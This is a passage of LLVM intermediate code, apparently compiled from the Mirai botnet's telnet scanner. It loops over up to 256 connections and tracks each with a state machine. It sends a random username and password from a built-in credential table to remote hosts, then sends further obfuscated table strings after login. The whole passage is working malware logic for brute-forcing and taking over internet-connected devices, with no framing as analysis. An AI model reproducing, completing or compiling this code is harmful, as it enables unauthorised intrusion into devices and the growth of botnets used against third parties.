  %405 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %404, i32 0, i32 3
  %406 = load i32, i32* %405, align 8
  %407 = icmp ugt i32 %406, 1
  %408 = zext i1 %407 to i64
  %409 = select i1 %407, i32 30, i32 5
  store i32 %409, i32* %28, align 4
  %410 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %411 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %410, i32 0, i32 3
  %412 = load i32, i32* %411, align 8
  %413 = icmp ne i32 %412, 0
  br i1 %413, label %414, label %454

414:                                              ; preds = %399
  %415 = load i32, i32* @fake_time, align 4
  %416 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %417 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %416, i32 0, i32 2
  %418 = load i32, i32* %417, align 4
  %419 = sub i32 %415, %418
  %420 = load i32, i32* %28, align 4
  %421 = icmp ugt i32 %419, %420
  br i1 %421, label %422, label %454

422:                                              ; preds = %414
  %423 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %424 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %423, i32 0, i32 1
  %425 = load i32, i32* %424, align 8
  %426 = call i32 @close(i32 noundef %425)
  %427 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %428 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %427, i32 0, i32 1
  store i32 -1, i32* %428, align 8
  %429 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %430 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %429, i32 0, i32 3
  %431 = load i32, i32* %430, align 8
  %432 = icmp ugt i32 %431, 2
  br i1 %432, label %433, label %448

433:                                              ; preds = %422
  %434 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %435 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %434, i32 0, i32 8
  %436 = load i8, i8* %435, align 8
  %437 = add i8 %436, 1
  store i8 %437, i8* %435, align 8
  %438 = zext i8 %437 to i32
  %439 = icmp eq i32 %438, 10
  br i1 %439, label %440, label %445

440:                                              ; preds = %433
  %441 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %442 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %441, i32 0, i32 8
  store i8 0, i8* %442, align 8
  %443 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %444 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %443, i32 0, i32 3
  store i32 0, i32* %444, align 8
  br label %447

445:                                              ; preds = %433
  %446 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* noundef %446)
  br label %447

447:                                              ; preds = %445, %440
  br label %453

448:                                              ; preds = %422
  %449 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %450 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %449, i32 0, i32 8
  store i8 0, i8* %450, align 8
  %451 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %452 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %451, i32 0, i32 3
  store i32 0, i32* %452, align 8
  br label %453

453:                                              ; preds = %448, %447
  br label %518

454:                                              ; preds = %414, %399
  %455 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %456 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %455, i32 0, i32 3
  %457 = load i32, i32* %456, align 8
  %458 = icmp eq i32 %457, 1
  br i1 %458, label %459, label %485

459:                                              ; preds = %454
  %460 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %461 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %460, i32 0, i32 1
  %462 = load i32, i32* %461, align 8
  %463 = srem i32 %462, 64
  %464 = zext i32 %463 to i64
  %465 = shl i64 1, %464
  %466 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %467 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %468 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %467, i32 0, i32 1
  %469 = load i32, i32* %468, align 8
  %470 = sdiv i32 %469, 64
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds [16 x i64], [16 x i64]* %466, i64 0, i64 %471
  %473 = load i64, i64* %472, align 8
  %474 = or i64 %473, %465
  store i64 %474, i64* %472, align 8
  %475 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %476 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %475, i32 0, i32 1
  %477 = load i32, i32* %476, align 8
  %478 = load i32, i32* %12, align 4
  %479 = icmp sgt i32 %477, %478
  br i1 %479, label %480, label %484

480:                                              ; preds = %459
  %481 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %482 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %481, i32 0, i32 1
  %483 = load i32, i32* %482, align 8
  store i32 %483, i32* %12, align 4
  br label %484

484:                                              ; preds = %480, %459
  br label %517

485:                                              ; preds = %454
  %486 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %487 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %486, i32 0, i32 3
  %488 = load i32, i32* %487, align 8
  %489 = icmp ne i32 %488, 0
  br i1 %489, label %490, label %516

490:                                              ; preds = %485
  %491 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %492 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %491, i32 0, i32 1
  %493 = load i32, i32* %492, align 8
  %494 = srem i32 %493, 64
  %495 = zext i32 %494 to i64
  %496 = shl i64 1, %495
  %497 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %498 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %499 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %498, i32 0, i32 1
  %500 = load i32, i32* %499, align 8
  %501 = sdiv i32 %500, 64
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds [16 x i64], [16 x i64]* %497, i64 0, i64 %502
  %504 = load i64, i64* %503, align 8
  %505 = or i64 %504, %496
  store i64 %505, i64* %503, align 8
  %506 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %507 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %506, i32 0, i32 1
  %508 = load i32, i32* %507, align 8
  %509 = load i32, i32* %11, align 4
  %510 = icmp sgt i32 %508, %509
  br i1 %510, label %511, label %515

511:                                              ; preds = %490
  %512 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %513 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %512, i32 0, i32 1
  %514 = load i32, i32* %513, align 8
  store i32 %514, i32* %11, align 4
  br label %515

515:                                              ; preds = %511, %490
  br label %516

516:                                              ; preds = %515, %485
  br label %517

517:                                              ; preds = %516, %484
  br label %518

518:                                              ; preds = %517, %453
  %519 = load i32, i32* %1, align 4
  %520 = add nsw i32 %519, 1
  store i32 %520, i32* %1, align 4
  br label %396, !llvm.loop !48

521:                                              ; preds = %396
  %522 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 1
  store i64 0, i64* %522, align 8
  %523 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 0
  store i64 1, i64* %523, align 8
  %524 = load i32, i32* %12, align 4
  %525 = load i32, i32* %11, align 4
  %526 = icmp sgt i32 %524, %525
  br i1 %526, label %527, label %529

527:                                              ; preds = %521
  %528 = load i32, i32* %12, align 4
  br label %531

529:                                              ; preds = %521
  %530 = load i32, i32* %11, align 4
  br label %531

531:                                              ; preds = %529, %527
  %532 = phi i32 [ %528, %527 ], [ %530, %529 ]
  %533 = add nsw i32 1, %532
  %534 = call i32 @select(i32 noundef %533, %struct.fd_set.26* noundef %5, %struct.fd_set.26* noundef %6, %struct.fd_set.26* noundef null, %struct.timeval.27* noundef %8)
  store i32 %534, i32* %13, align 4
  %535 = call i64 @time(i64* noundef null) #7
  %536 = trunc i64 %535 to i32
  store i32 %536, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %537

537:                                              ; preds = %956, %531
  %538 = load i32, i32* %1, align 4
  %539 = icmp slt i32 %538, 256
  br i1 %539, label %540, label %959

540:                                              ; preds = %537
  %541 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %542 = load i32, i32* %1, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %541, i64 %543
  store %struct.scanner_connection* %544, %struct.scanner_connection** %7, align 8
  %545 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %546 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %545, i32 0, i32 1
  %547 = load i32, i32* %546, align 8
  %548 = icmp eq i32 %547, -1
  br i1 %548, label %549, label %550

549:                                              ; preds = %540
  br label %956

550:                                              ; preds = %540
  %551 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %552 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %553 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %552, i32 0, i32 1
  %554 = load i32, i32* %553, align 8
  %555 = sdiv i32 %554, 64
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds [16 x i64], [16 x i64]* %551, i64 0, i64 %556
  %558 = load i64, i64* %557, align 8
  %559 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %560 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %559, i32 0, i32 1
  %561 = load i32, i32* %560, align 8
  %562 = srem i32 %561, 64
  %563 = zext i32 %562 to i64
  %564 = shl i64 1, %563
  %565 = and i64 %558, %564
  %566 = icmp ne i64 %565, 0
  br i1 %566, label %567, label %598

567:                                              ; preds = %550
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %568 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %569 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %568, i32 0, i32 1
  %570 = load i32, i32* %569, align 8
  %571 = bitcast i32* %29 to i8*
  %572 = call i32 @getsockopt(i32 noundef %570, i32 noundef 1, i32 noundef 4, i8* noundef %571, i32* noundef %31) #7
  store i32 %572, i32* %30, align 4
  %573 = load i32, i32* %29, align 4
  %574 = icmp eq i32 %573, 0
  br i1 %574, label %575, label %586

575:                                              ; preds = %567
  %576 = load i32, i32* %30, align 4
  %577 = icmp eq i32 %576, 0
  br i1 %577, label %578, label %586

578:                                              ; preds = %575
  %579 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %580 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %579, i32 0, i32 3
  store i32 2, i32* %580, align 8
  %581 = call %struct.scanner_auth* @random_auth_entry()
  %582 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %583 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %582, i32 0, i32 0
  store %struct.scanner_auth* %581, %struct.scanner_auth** %583, align 8
  %584 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %585 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %584, i32 0, i32 6
  store i32 0, i32* %585, align 4
  br label %597

586:                                              ; preds = %575, %567
  %587 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %588 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %587, i32 0, i32 1
  %589 = load i32, i32* %588, align 8
  %590 = call i32 @close(i32 noundef %589)
  %591 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %592 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %591, i32 0, i32 1
  store i32 -1, i32* %592, align 8
  %593 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %594 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %593, i32 0, i32 8
  store i8 0, i8* %594, align 8
  %595 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %596 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %595, i32 0, i32 3
  store i32 0, i32* %596, align 8
  br label %956

597:                                              ; preds = %578
  br label %598

598:                                              ; preds = %597, %550
  %599 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %600 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %601 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %600, i32 0, i32 1
  %602 = load i32, i32* %601, align 8
  %603 = sdiv i32 %602, 64
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds [16 x i64], [16 x i64]* %599, i64 0, i64 %604
  %606 = load i64, i64* %605, align 8
  %607 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %608 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %607, i32 0, i32 1
  %609 = load i32, i32* %608, align 8
  %610 = srem i32 %609, 64
  %611 = zext i32 %610 to i64
  %612 = shl i64 1, %611
  %613 = and i64 %606, %612
  %614 = icmp ne i64 %613, 0
  br i1 %614, label %615, label %955

615:                                              ; preds = %598
  br label %616

616:                                              ; preds = %953, %615
  %617 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %618 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %617, i32 0, i32 3
  %619 = load i32, i32* %618, align 8
  %620 = icmp eq i32 %619, 0
  br i1 %620, label %621, label %622

621:                                              ; preds = %616
  br label %954

622:                                              ; preds = %616
  %623 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %624 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %623, i32 0, i32 6
  %625 = load i32, i32* %624, align 4
  %626 = icmp eq i32 %625, 256
  br i1 %626, label %627, label %639

627:                                              ; preds = %622
  %628 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %629 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %628, i32 0, i32 7
  %630 = getelementptr inbounds [256 x i8], [256 x i8]* %629, i64 0, i64 0
  %631 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %632 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %631, i32 0, i32 7
  %633 = getelementptr inbounds [256 x i8], [256 x i8]* %632, i64 0, i64 0
  %634 = getelementptr inbounds i8, i8* %633, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %630, i8* align 1 %634, i64 192, i1 false)
  %635 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %636 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %635, i32 0, i32 6
  %637 = load i32, i32* %636, align 4
  %638 = sub nsw i32 %637, 64
  store i32 %638, i32* %636, align 4
  br label %639

639:                                              ; preds = %627, %622
  %640 = call i32* @__errno_location() #8
  store i32 0, i32* %640, align 4
  %641 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %642 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %641, i32 0, i32 1
  %643 = load i32, i32* %642, align 8
  %644 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %645 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %644, i32 0, i32 7
  %646 = getelementptr inbounds [256 x i8], [256 x i8]* %645, i64 0, i64 0
  %647 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %648 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %647, i32 0, i32 6
  %649 = load i32, i32* %648, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds i8, i8* %646, i64 %650
  %652 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %653 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %652, i32 0, i32 6
  %654 = load i32, i32* %653, align 4
  %655 = sub nsw i32 256, %654
  %656 = call i32 @recv_strip_null(i32 noundef %643, i8* noundef %651, i32 noundef %655, i32 noundef 16384)
  store i32 %656, i32* %32, align 4
  %657 = load i32, i32* %32, align 4
  %658 = icmp eq i32 %657, 0
  br i1 %658, label %659, label %661

659:                                              ; preds = %639
  %660 = call i32* @__errno_location() #8
  store i32 104, i32* %660, align 4
  store i32 -1, i32* %32, align 4
  br label %661

661:                                              ; preds = %659, %639
  %662 = load i32, i32* %32, align 4
  %663 = icmp eq i32 %662, -1
  br i1 %663, label %664, label %694

664:                                              ; preds = %661
  %665 = call i32* @__errno_location() #8
  %666 = load i32, i32* %665, align 4
  %667 = icmp ne i32 %666, 11
  br i1 %667, label %668, label %693

668:                                              ; preds = %664
  %669 = call i32* @__errno_location() #8
  %670 = load i32, i32* %669, align 4
  %671 = icmp ne i32 %670, 11
  br i1 %671, label %672, label %693

672:                                              ; preds = %668
  %673 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %674 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %673, i32 0, i32 1
  %675 = load i32, i32* %674, align 8
  %676 = call i32 @close(i32 noundef %675)
  %677 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %678 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %677, i32 0, i32 1
  store i32 -1, i32* %678, align 8
  %679 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %680 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %679, i32 0, i32 8
  %681 = load i8, i8* %680, align 8
  %682 = add i8 %681, 1
  store i8 %682, i8* %680, align 8
  %683 = zext i8 %682 to i32
  %684 = icmp sge i32 %683, 10
  br i1 %684, label %685, label %690

685:                                              ; preds = %672
  %686 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %687 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %686, i32 0, i32 8
  store i8 0, i8* %687, align 8
  %688 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %689 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %688, i32 0, i32 3
  store i32 0, i32* %689, align 8
  br label %692

690:                                              ; preds = %672
  %691 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* noundef %691)
  br label %692

692:                                              ; preds = %690, %685
  br label %693

693:                                              ; preds = %692, %668, %664
  br label %954

694:                                              ; preds = %661
  %695 = load i32, i32* %32, align 4
  %696 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %697 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %696, i32 0, i32 6
  %698 = load i32, i32* %697, align 4
  %699 = add nsw i32 %698, %695
  store i32 %699, i32* %697, align 4
  %700 = load i32, i32* @fake_time, align 4
  %701 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %702 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %701, i32 0, i32 2
  store i32 %700, i32* %702, align 4
  br label %703

703:                                              ; preds = %952, %694
  store i32 0, i32* %33, align 4
  %704 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %705 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %704, i32 0, i32 3
  %706 = load i32, i32* %705, align 8
  switch i32 %706, label %918 [
    i32 2, label %707
    i32 3, label %715
    i32 4, label %742
    i32 5, label %769
    i32 6, label %789
    i32 7, label %809
    i32 8, label %829
    i32 9, label %849
    i32 10, label %869
  ]

707:                                              ; preds = %703
  %708 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %709 = call i32 @consume_iacs(%struct.scanner_connection* noundef %708)
  store i32 %709, i32* %33, align 4
  %710 = icmp sgt i32 %709, 0
  br i1 %710, label %711, label %714

711:                                              ; preds = %707
  %712 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %713 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %712, i32 0, i32 3
  store i32 3, i32* %713, align 8
  br label %714

714:                                              ; preds = %711, %707
  br label %919

715:                                              ; preds = %703
  %716 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %717 = call i32 @consume_user_prompt(%struct.scanner_connection* noundef %716)
  store i32 %717, i32* %33, align 4
  %718 = icmp sgt i32 %717, 0
  br i1 %718, label %719, label %741

719:                                              ; preds = %715
  %720 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %721 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %720, i32 0, i32 1
  %722 = load i32, i32* %721, align 8
  %723 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %724 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %723, i32 0, i32 0
  %725 = load %struct.scanner_auth*, %struct.scanner_auth** %724, align 8
  %726 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %725, i32 0, i32 0
  %727 = load i8*, i8** %726, align 8
  %728 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %729 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %728, i32 0, i32 0
  %730 = load %struct.scanner_auth*, %struct.scanner_auth** %729, align 8
  %731 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %730, i32 0, i32 4
  %732 = load i8, i8* %731, align 4
  %733 = zext i8 %732 to i64
  %734 = call i64 @send(i32 noundef %722, i8* noundef %727, i64 noundef %733, i32 noundef 16384)
  %735 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %736 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %735, i32 0, i32 1
  %737 = load i32, i32* %736, align 8
  %738 = call i64 @send(i32 noundef %737, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %739 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %740 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %739, i32 0, i32 3
  store i32 4, i32* %740, align 8
  br label %741

741:                                              ; preds = %719, %715
  br label %919

742:                                              ; preds = %703
  %743 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %744 = call i32 @consume_pass_prompt(%struct.scanner_connection* noundef %743)
  store i32 %744, i32* %33, align 4
  %745 = icmp sgt i32 %744, 0
  br i1 %745, label %746, label %768

746:                                              ; preds = %742
  %747 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %748 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %747, i32 0, i32 1
  %749 = load i32, i32* %748, align 8
  %750 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %751 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %750, i32 0, i32 0
  %752 = load %struct.scanner_auth*, %struct.scanner_auth** %751, align 8
  %753 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %752, i32 0, i32 1
  %754 = load i8*, i8** %753, align 8
  %755 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %756 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %755, i32 0, i32 0
  %757 = load %struct.scanner_auth*, %struct.scanner_auth** %756, align 8
  %758 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %757, i32 0, i32 5
  %759 = load i8, i8* %758, align 1
  %760 = zext i8 %759 to i64
  %761 = call i64 @send(i32 noundef %749, i8* noundef %754, i64 noundef %760, i32 noundef 16384)
  %762 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %763 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %762, i32 0, i32 1
  %764 = load i32, i32* %763, align 8
  %765 = call i64 @send(i32 noundef %764, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %766 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %767 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %766, i32 0, i32 3
  store i32 5, i32* %767, align 8
  br label %768

768:                                              ; preds = %746, %742
  br label %919

769:                                              ; preds = %703
  %770 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %771 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %770)
  store i32 %771, i32* %33, align 4
  %772 = icmp sgt i32 %771, 0
  br i1 %772, label %773, label %788

773:                                              ; preds = %769
  call void @table_unlock_val(i8 noundef zeroext 5)
  %774 = call i8* @table_retrieve_val(i32 noundef 5, i32* noundef %35)
  store i8* %774, i8** %34, align 8
  %775 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %776 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %775, i32 0, i32 1
  %777 = load i32, i32* %776, align 8
  %778 = load i8*, i8** %34, align 8
  %779 = load i32, i32* %35, align 4
  %780 = sext i32 %779 to i64
  %781 = call i64 @send(i32 noundef %777, i8* noundef %778, i64 noundef %780, i32 noundef 16384)
  %782 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %783 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %782, i32 0, i32 1
  %784 = load i32, i32* %783, align 8
  %785 = call i64 @send(i32 noundef %784, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 5)
  %786 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %787 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %786, i32 0, i32 3
  store i32 6, i32* %787, align 8
  br label %788

788:                                              ; preds = %773, %769
  br label %919

789:                                              ; preds = %703
  %790 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %791 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %790)
  store i32 %791, i32* %33, align 4
  %792 = icmp sgt i32 %791, 0
  br i1 %792, label %793, label %808

793:                                              ; preds = %789
  call void @table_unlock_val(i8 noundef zeroext 6)
  %794 = call i8* @table_retrieve_val(i32 noundef 6, i32* noundef %37)
  store i8* %794, i8** %36, align 8
  %795 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %796 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %795, i32 0, i32 1
  %797 = load i32, i32* %796, align 8
  %798 = load i8*, i8** %36, align 8
  %799 = load i32, i32* %37, align 4
  %800 = sext i32 %799 to i64
  %801 = call i64 @send(i32 noundef %797, i8* noundef %798, i64 noundef %800, i32 noundef 16384)
  %802 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %803 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %802, i32 0, i32 1
  %804 = load i32, i32* %803, align 8
  %805 = call i64 @send(i32 noundef %804, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 6)
  %806 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %807 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %806, i32 0, i32 3
  store i32 7, i32* %807, align 8
  br label %808

808:                                              ; preds = %793, %789
  br label %919

809:                                              ; preds = %703
  %810 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %811 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %810)
  store i32 %811, i32* %33, align 4
  %812 = icmp sgt i32 %811, 0
  br i1 %812, label %813, label %828

813:                                              ; preds = %809
  call void @table_unlock_val(i8 noundef zeroext 4)
  %814 = call i8* @table_retrieve_val(i32 noundef 4, i32* noundef %39)
  store i8* %814, i8** %38, align 8
  %815 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %816 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %815, i32 0, i32 1
  %817 = load i32, i32* %816, align 8
  %818 = load i8*, i8** %38, align 8
  %819 = load i32, i32* %39, align 4
  %820 = sext i32 %819 to i64
  %821 = call i64 @send(i32 noundef %817, i8* noundef %818, i64 noundef %820, i32 noundef 16384)
  %822 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %823 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %822, i32 0, i32 1
  %824 = load i32, i32* %823, align 8
  %825 = call i64 @send(i32 noundef %824, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 4)
  %826 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %827 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %826, i32 0, i32 3
  store i32 8, i32* %827, align 8
  br label %828

828:                                              ; preds = %813, %809
  br label %919

829:                                              ; preds = %703
  %830 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %831 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %830)
  store i32 %831, i32* %33, align 4
  %832 = icmp sgt i32 %831, 0
  br i1 %832, label %833, label %848

833:                                              ; preds = %829
  call void @table_unlock_val(i8 noundef zeroext 7)
  %834 = call i8* @table_retrieve_val(i32 noundef 7, i32* noundef %41)
  store i8* %834, i8** %40, align 8
  %835 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %836 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %835, i32 0, i32 1
  %837 = load i32, i32* %836, align 8
  %838 = load i8*, i8** %40, align 8
  %839 = load i32, i32* %41, align 4
